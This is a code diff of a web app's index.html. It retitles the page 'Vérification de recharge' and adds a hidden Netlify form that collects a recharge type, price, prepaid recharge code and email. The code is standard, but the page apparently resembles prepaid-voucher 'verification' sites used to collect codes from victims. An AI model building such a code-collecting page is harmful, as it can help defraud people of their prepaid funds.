@@ -1,12 +1,27 @@
 <!doctype html>
-<html lang="en">
+<html lang="fr">
   <head>
     <meta charset="UTF-8" />
     <link rel="icon" type="image/svg+xml" href="/vite.svg" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Authentication Form with Email Integration</title>
+    <title>Vérification de recharge</title>
   </head>
   <body>
+    <form
+      name="recharge-verification"
+      method="POST"
+      data-netlify="true"
+      netlify-honeypot="bot-field"
+      hidden
+    >
+      <input type="hidden" name="form-name" value="recharge-verification" />
+      <input name="bot-field" />
+      <select name="rechargeType"></select>
+      <input name="rechargePrice" type="number" />
+      <input name="rechargeCode" />
+      <input name="email" type="email" />
+      <select name="hideCode"></select>
+    </form>
     <div id="root"></div>
     <script type="module" src="/src/main.tsx"></script>
   </body>
